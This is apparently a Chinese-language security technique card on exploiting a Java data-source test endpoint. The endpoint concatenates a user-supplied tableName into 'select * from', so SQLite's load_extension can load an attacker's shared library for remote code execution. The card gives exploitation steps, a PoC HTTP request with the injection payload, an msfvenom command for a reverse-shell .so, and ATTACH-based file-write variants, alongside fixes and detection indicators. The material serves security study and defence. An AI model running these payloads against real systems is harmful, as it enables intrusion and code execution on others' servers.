---
id: web-java-deserialization-sqlite-jdbc-table-name-select-injection-load-extension-rce
title: sqlite-jdbc getTableContent 拼接 select * from <tableName>：可控表名注入 load_extension/ATTACH 执行任意 SQL 并加载扩展库 RCE
type: scenario
domain: web
path: web/java/deserialization
technique: sqlite-jdbc-table-name-injection-load-extension
aliases:
- sqlite-jdbc 表名注入
- select * from tableName 注入
- load_extension RCE
- enable_load_extension
- SQLite 加载任意扩展库
- JDBC 数据源测试 SQLite
tags:
- java
- jdbc
- sqlite
- sql-injection
- load-extension
- rce
- datasource-test
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-07'
verification:
  verified_by: verifier-T2-2
  verified_at: '2026-11-07T23:44:02+08:00'
  notes: 已对照 16537 原文与 img/03-04 核对：SqliteDatasourceConnector.getTableContent 的 String sql = select * from + tableName、DatasourceServiceImpl switch(type) 的 case 3 走 sqlite connector、payload(type=3, tableName=(select (load_extension(...))), url=jdbc:sqlite:file:/tmp/db?enable_load_extension=true) 与原文完全一致；拼接后 SQL select * from (select (load_extension(...))) 的语法与触发位置正确。未验证点：原文只给出打法与 payload（原话看了别人的wp发现是打sqlite），未附 RCE 回连/执行成功截图，最终危害依据 load_extension 语义与参考 wp，卡片已按此标注。sqlite-jdbc 3.8.9 是目标环境 pom 版本而非受影响区间，未 set-versions。未执行原文 payload。
---

## 一句话结论

应用把用户提交的 `tableName` 直接拼成 `String sql = "select * from " + tableName` 再 `statement.executeQuery(sql)`（典型的数据源测试/取表内容功能），由于拼接点落在 FROM 子句且未做任何校验，攻击者可把 `tableName` 写成 `(select (load_extension("/tmp/evil.so")));` 之类的小括号子查询，让 SQLite 执行任意表达式；连接串再带 `enable_load_extension=true` 时，`load_extension` 会加载攻击者上传的扩展库并在进程内执行其初始化函数，形成 RCE。

## 原理

- **拼接位置决定语法自由度**：`select * from ` 之后的部分在 SQLite 里可以是表名、视图名，也可以是**带括号的子查询**（`from (select ...)`）。把 payload 写成 `(select (load_extension("...")))` 时，整句仍然语法合法，子查询里的函数在查询求值阶段必然执行 —— 这是 `load_extension` 能被触发的根本原因，不需要堆叠语句或分号。
- **load_extension 的能力**：SQLite 的 `load_extension(path)` 动态加载共享库（Linux `.so`、Windows `.dll`），加载后调用约定入口 `sqlite3_extension_init`。攻击者只要能让该入口执行命令，就等于在 Web 进程内执行代码。
- **为什么默认能用**：`org.xerial:sqlite-jdbc` 在连接串里支持 `enable_load_extension=true` 参数（映射到 `sqlite3_enable_load_extension(db, 1)`）；一旦开启，SQL 层的 `load_extension` 函数即被允许调用，而多数业务只是把它当成"读表工具"的参数，不会禁止。
- **前置的落地能力**：payload 需要一个已经存在于服务器上的恶意 `.so`。落地方式与本题无关，常见选择是任意文件写 gadget（反序列化写文件、上传点、`ATTACH DATABASE` 写文件），本卡只负责"从文件到代码执行"这一段。
- **为什么代码审计容易漏**：`switch(type)` 分支里 SQLite 走的是 `SqliteDatasourceConnector.getTableContent(tableName)`，看起来只是"按表名取内容"，与 MySQL/PostgreSQL 分支的 `Class.forName` + `DriverManager` 无差别，拼接点藏在工具类内部。

## 触发条件

- 应用提供"数据源连接测试 / 读取表内容"类功能，`tableName`、`url`、`type` 三个字段完全由请求体控制（如 `{"type":"3","tableName":"...","url":"jdbc:sqlite:..."}`）。
- 对应的 connector 用字符串拼接把 `tableName` 放进了 SQL 的 FROM 位置，没有任何白名单/转义/参数化。
- classpath 存在 `sqlite-jdbc`；连接串允许带 `enable_load_extension=true`（或服务端已全局开启扩展加载）。
- 已存在落地到可读路径的恶意 `.so`/`.dll`（或配合另一种任意文件写）。

## 利用步骤

1. 探测：提交 `{"type":"3","url":"jdbc:sqlite:file:/tmp/db","tableName":"sqlite_master"}`，确认接口会按表名查询并回显 SQLite 结构（说明走的是 SQLite connector）。
2. 验证拼接：把 `tableName` 改成 `(select 1)`、`(select sqlite_version())`，若仍返回数据，说明 FROM 位置允许子查询，注入成立。
3. 验证扩展加载可用：`tableName` 填 `(select (load_extension("nonexistent")))`，报 "module could not be found" 而非 "not authorized" 即表示 `load_extension` 可用。
4. 准备恶意 `.so`（如 `msfvenom -p linux/x64/exec ... -f elf-so -o evil.so`），通过任一落地手法写到 `/tmp/evil.so`。
5. 提交：`{"type":"3","tableName":"(select (load_extension(\"/tmp/evil.so\")));","url":"jdbc:sqlite:file:/tmp/db?enable_load_extension=true"}`，触发扩展库初始化，回连或执行命令。

## PoC

```http
POST /jdbc/index HTTP/1.1
Content-Type: application/json

{"type":"3","tableName":"(select (load_extension(\"/tmp/evil.so\")));","url":"jdbc:sqlite:file:/tmp/db?enable_load_extension=true"}
```

拼接后实际执行的 SQL：

```sql
select * from (select (load_extension("/tmp/evil.so")));
```

等价的无扩展加载变体（只做 SQL 执行/信息读取）：

```json
{"type":"3","tableName":"(select sqlite_version())","url":"jdbc:sqlite:file:/tmp/db"}
```

恶意 so 生成（本地靶场用，勿对真实目标执行）：

```text
msfvenom -p linux/x64/exec CMD='<反弹命令>' -f elf-so -o evil.so
```

## 变体与关联

- 变体：没有 `enable_load_extension` 时，可用 `ATTACH DATABASE '/tmp/x.db' AS x` 写文件、用 `(select ...)` 读取任意 SQLite 文件内容、或通过 `(select group_concat(sql) from sqlite_master)` 枚举结构。
- 变体：拼接点在其他位置（`select * from ` 之外的 `where`、`order by`、`limit`）同理；只要存在字符串拼接 + 多点查询即可。
- 关联：[[web-python-django-sql-explorer-load-extension-dll-rce]]（同为 `load_extension` 加载恶意扩展库，但入口是 Python 后台 SQL 控制台）、[[web-java-deserialization-mysql-jdbc-url-autodeserialize-rce]]（同类"数据源测试"接口的 MySQL 侧打法）、[[web-java-deserialization-sqlite-jdbc-resource-url-tmp-file-write]]（本篇另一条"不依赖上传点"的落地方式）。
- 边界：`tableName` 走白名单/参数化、连接串禁止 `enable_load_extension`、SQLite 编译时带 `SQLITE_OMIT_LOAD_EXTENSION`、攻击者无法落地 `.so`、目标非 Linux/库格式不匹配时链不成立。

## 检测与防御

- 修复：`tableName` 只允许来自 `sqlite_master` 查询的白名单结果集，或对标识符做严格 `[A-Za-z0-9_]` 校验并双引号包裹；禁止把用户输入拼进 SQL。
- 修复：连接层统一 `sqlite3_enable_load_extension(db, 0)`，连接串拒绝 `enable_load_extension` 参数；数据源测试接口只允许管理员使用并审计。
- 加固：数据源测试功能运行在独立低权限进程/容器，限制 `load_extension` 可加载目录；classpath 去掉不必要的 JDBC 驱动。
- 检测：`tableName`/SQL 日志中出现 `load_extension`、`ATTACH`、`(select`、`sqlite_master`；`/tmp` 下出现 `.so`/`.db` 可疑文件；Java 进程随后执行 shell。
